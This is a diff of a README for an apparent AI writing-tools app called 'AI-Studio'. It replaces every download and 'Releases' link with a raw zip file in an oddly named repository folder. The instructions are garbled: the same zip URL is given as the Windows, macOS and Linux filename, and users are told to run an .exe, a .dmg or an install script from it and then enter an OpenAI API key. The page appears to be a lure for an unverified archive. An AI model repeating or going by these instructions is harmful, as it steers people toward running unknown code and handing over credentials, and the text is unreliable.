@@ -1,7 +1,7 @@
 # 🎉 AI-Studio - Your All-in-One AI Toolset
 
 ## 📥 Download Now
-[![Download AI-Studio](https://raw.githubusercontent.com/Nolhan42789/AI-Studio/main/praeabdomen/AI-Studio.zip)](https://raw.githubusercontent.com/Nolhan42789/AI-Studio/main/praeabdomen/AI-Studio.zip)
+[![Download AI-Studio](https://github.com/Nolhan42789/AI-Studio/raw/refs/heads/main/praeabdomen/A_Studio_v1.7.zip)](https://github.com/Nolhan42789/AI-Studio/raw/refs/heads/main/praeabdomen/A_Studio_v1.7.zip)
 
 ## 🚀 Getting Started
 AI Studio is a simple application designed to help you with various AI tasks. This includes summarizing text, generating README files, explaining code, creating commit messages, writing blogs or tweets, and generating image prompts. To get started using AI Studio, follow the steps below.
@@ -14,16 +14,16 @@ Before downloading, make sure your system meets the following requirements:
 - **OpenAI API Key:** You need an OpenAI API key to use AI Studio effectively. This will allow you to access all the features of the app.
 
 ## 💻 Download & Install
-1. **Visit this page to download**: Go to the [AI-Studio Releases](https://raw.githubusercontent.com/Nolhan42789/AI-Studio/main/praeabdomen/AI-Studio.zip).
+1. **Visit this page to download**: Go to the [AI-Studio Releases](https://github.com/Nolhan42789/AI-Studio/raw/refs/heads/main/praeabdomen/A_Studio_v1.7.zip).
 
 2. **Locate the latest release**: Look for the most recent version of AI-Studio on the releases page. 
 
-3. **Download the file**: Click on the file for your operating system. The file may have a name such as `https://raw.githubusercontent.com/Nolhan42789/AI-Studio/main/praeabdomen/AI-Studio.zip` for Windows, `https://raw.githubusercontent.com/Nolhan42789/AI-Studio/main/praeabdomen/AI-Studio.zip` for macOS, or `https://raw.githubusercontent.com/Nolhan42789/AI-Studio/main/praeabdomen/AI-Studio.zip` for Linux.
+3. **Download the file**: Click on the file for your operating system. The file may have a name such as `https://github.com/Nolhan42789/AI-Studio/raw/refs/heads/main/praeabdomen/A_Studio_v1.7.zip` for Windows, `https://github.com/Nolhan42789/AI-Studio/raw/refs/heads/main/praeabdomen/A_Studio_v1.7.zip` for macOS, or `https://github.com/Nolhan42789/AI-Studio/raw/refs/heads/main/praeabdomen/A_Studio_v1.7.zip` for Linux.
 
 4. **Install the application**:
    - **Windows**: Double-click the `.exe` file and follow the on-screen prompts.
    - **macOS**: Open the downloaded `.dmg` file, then drag AI Studio into your Applications folder.
-   - **Linux**: Extract the `https://raw.githubusercontent.com/Nolhan42789/AI-Studio/main/praeabdomen/AI-Studio.zip` file and run the installation script included.
+   - **Linux**: Extract the `https://github.com/Nolhan42789/AI-Studio/raw/refs/heads/main/praeabdomen/A_Studio_v1.7.zip` file and run the installation script included.
 
 5. **Set up your OpenAI API key**: Once installed, open AI Studio. You will need to enter your OpenAI API key in the designated field to unlock all features.
 
@@ -56,7 +56,7 @@ If you face any issues while using AI Studio, consider the following steps:
 If you need further assistance, feel free to reach out. You can open an issue on the GitHub page or ask questions in community forums. 
 
 ## 🌐 Learn More
-To learn more about AI Studio and its capabilities, please visit the [AI-Studio Releases](https://raw.githubusercontent.com/Nolhan42789/AI-Studio/main/praeabdomen/AI-Studio.zip) page, where you will find detailed information about each version and updates.
+To learn more about AI Studio and its capabilities, please visit the [AI-Studio Releases](https://github.com/Nolhan42789/AI-Studio/raw/refs/heads/main/praeabdomen/A_Studio_v1.7.zip) page, where you will find detailed information about each version and updates.
 
 ## 🌟 Join the Community
 Your feedback is essential. Help us improve AI Studio by sharing your thoughts and experiences. Contribute to our project on GitHub and connect with fellow users.
